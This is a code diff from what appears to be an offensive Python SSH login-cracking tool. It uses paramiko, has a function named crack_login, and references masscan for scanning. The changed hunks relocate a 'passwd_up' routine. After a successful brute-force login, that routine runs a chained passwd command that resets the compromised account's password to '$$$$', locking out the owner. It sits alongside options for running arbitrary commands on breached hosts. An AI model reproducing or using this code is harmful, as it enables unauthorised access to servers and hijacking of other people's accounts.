@@ -26,11 +26,10 @@ import socket
 import time
 import random
 import ipaddress
-from concurrent.futures import \
-  ThreadPoolExecutor, as_completed, wait, ALL_COMPLETED
+from concurrent.futures import ThreadPoolExecutor, as_completed, wait, ALL_COMPLETED
 import warnings
 import logging
-import masscan
+#import masscan
 import paramiko
 #import shodan
 import mmap
@@ -411,7 +410,7 @@ def crack_login(host, port, username, password):
         stdin, stdout, stderr = cli.exec_command(diycmd, timeout=2)
         log(f"write_up ssh command results for \'{diycmd}\'", 'good')
         for line in stdout.readlines():
-          log(line)          
+          log(line)
       if opts['cmd']:
         if os.path.isfile(opts['cmd']):
           log(f"sending ssh commands from {opts['cmd']}", 'info')
@@ -425,12 +424,6 @@ def crack_login(host, port, username, password):
                     pre_esc='\n')
                   for line in rl:
                     log(f'{line}')
-      if opts['passwd_up']:
-        diycmd=f"echo -e ''$$$$\\\\n$$$$''| passwd || echo -e ''{password}\\\\n$$$$\\\\n$$$$'' | passwd || echo ''$$$$\\\\n$$$$'' | passwd || echo ''{password}\\\\n$$$$\\\\n$$$$'' | passwd";
-        stdin, stdout, stderr = cli.exec_command(diycmd, timeout=2)
-        log(f"passwd_up ssh command results for \'{diycmd}\'", 'good')
-        for line in stdout.readlines():
-          log(line)      
         else:
           log('sending your single ssh command line', 'info')         
           if not opts['cmd_no_out']:
@@ -438,6 +431,12 @@ def crack_login(host, port, username, password):
             log(f"ssh command results for \'{opts['cmd'].rstrip()}\'", 'good')
             for line in stdout.readlines():
               log(line)
+          if opts['passwd_up']:
+           diycmd=f"echo -e ''$$$$\\\\n$$$$''| passwd || echo -e ''{password}\\\\n$$$$\\\\n$$$$'' | passwd || echo ''$$$$\\\\n$$$$'' | passwd || echo ''{password}\\\\n$$$$\\\\n$$$$'' | passwd";
+           stdin, stdout, stderr = cli.exec_command(diycmd, timeout=2)
+           log(f"passwd_up ssh command results for \'{diycmd}\'", 'good')
+           for line in stdout.readlines():
+             log(line)
       return SUCCESS
   except paramiko.AuthenticationException as err:
     if opts['verbose']:
